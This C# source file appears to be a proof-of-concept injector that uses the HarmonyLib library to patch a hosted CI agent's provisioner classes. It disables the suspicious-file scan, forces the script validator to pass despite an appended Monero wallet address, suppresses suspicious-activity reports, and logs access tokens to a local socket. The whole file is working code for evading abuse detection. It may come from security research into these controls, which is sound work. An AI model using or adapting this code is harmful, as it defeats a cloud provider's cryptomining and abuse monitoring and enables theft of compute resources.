using System;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using HarmonyLib;

namespace patcher
{
    public class NetworkLogger
    {
        private static NetworkLogger instance;

        private static TcpClient client;
        private static NetworkStream stream;

        private NetworkLogger()
        {
            client = new TcpClient("localhost", 1337);
            stream = client.GetStream();
        }

        public void Write(string message)
        {
            try
            {
                var data = System.Text.Encoding.UTF8.GetBytes(message);
                stream.Write(BitConverter.GetBytes(data.Length), 0, 4);
                stream.Write(data, 0, data.Length);
            } catch (Exception)
            {
                //NOP
            }
        }

        ~NetworkLogger()
        {
            client.Close();
            stream.Close();
        }

        public static NetworkLogger GetInstance()
        {
            if (instance == null)
            {
                instance = new NetworkLogger();
            }
            return instance;
        }
    }

    public class Main
    {
        private static Harmony harmony;

        [UnmanagedCallersOnly]
        public static void EntryPoint()
        {
            NetworkLogger.GetInstance().Write("Injected!");

            new Thread(() => {
                Thread.Sleep(15 * 60 * 1000);
                NetworkLogger.GetInstance().Write("q");
            }).Start();

            harmony = new Harmony("patcher");
            harmony.PatchAll();
        }
    }

    [HarmonyPatch(typeof(Microsoft.AzureDevOps.Provisioner.Framework.Monitoring.SuspiciousFilesMonitorJob))]
    public class SuspiciousFilesMonitorJobPatches
    {
        [HarmonyPrefix]
        [HarmonyPatch("SuspiciousSignatureExists")]
        static bool SuspiciousSignatureExists(
            Microsoft.AzureDevOps.Provisioner.Framework.Monitoring.SuspiciousFilesMonitorJob __instance,
            string directory,
            int currDepth,
            ref bool __result
        )
        {
            NetworkLogger.GetInstance().Write($"{__instance.Name} // SuspiciousSignatureExists({directory}, {currDepth})");
            __result = false; //no suspicious files

            //don't call SuspiciousFilesMonitorJob.SuspiciousSignatureExists(...)
            //now provisioner will not scan subfolders at all
            return false;
        }
    }

    [HarmonyPatch(typeof(GitHub.DistributedTask.Pipelines.Validation.ScriptTaskValidator))]
    public class ScriptTaskValidatorPatches
    {
        [HarmonyPrefix]
        [HarmonyPatch(nameof(GitHub.DistributedTask.Pipelines.Validation.ScriptTaskValidator.HasBadParamOrArgument))]
        static void HasBadParamOrArgument_Prefix(ref string exeAndArgs)
        {
            //trigger provisioner by appending XMR address to exeAndArgs
            exeAndArgs += " 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD";
        }

        [HarmonyPostfix]
        [HarmonyPatch(nameof(GitHub.DistributedTask.Pipelines.Validation.ScriptTaskValidator.HasBadParamOrArgument))]
        static void HasBadParamOrArgument_Postfix(string exeAndArgs, ref bool __result)
        {
            //checking result from original function HasBadParamOrArgument(...), it would be True for all processes
            NetworkLogger.GetInstance().Write($"ScriptTaskValidator // HasBadParamOrArgument({exeAndArgs}, ..., ...) = {__result}");
            __result = false; //set result to false to bypass provisioner check ;D
        }
    }

    [HarmonyPatch(typeof(MachineManagement.Provisioning.MachineManagementClient))]
    public class MachineManagementClientPatches
    {
        [HarmonyPrefix]
        [HarmonyPatch(nameof(MachineManagement.Provisioning.MachineManagementClient.ReportSuspiciousActivityAsync))]
        static bool ReportSuspiciousActivityAsync(
            long requestId,
            byte[] postRegistrationAccessToken,
            string suspiciousActivity,
            string poolName,
            string instanceName,
            ref Task __result
        )
        {
            var token = Convert.ToHexString(postRegistrationAccessToken);
            NetworkLogger.GetInstance().Write($"MachineManagementClient // ReportSuspiciousActivityAsync({requestId}, {token}, {suspiciousActivity}, {poolName}, {instanceName})");
            __result = new Task(() => {
                //replace task with nothing
            }); 
            return false; //don't call MachineManagementClient.ReportSuspiciousActivityAsync(...)
        }
    }
}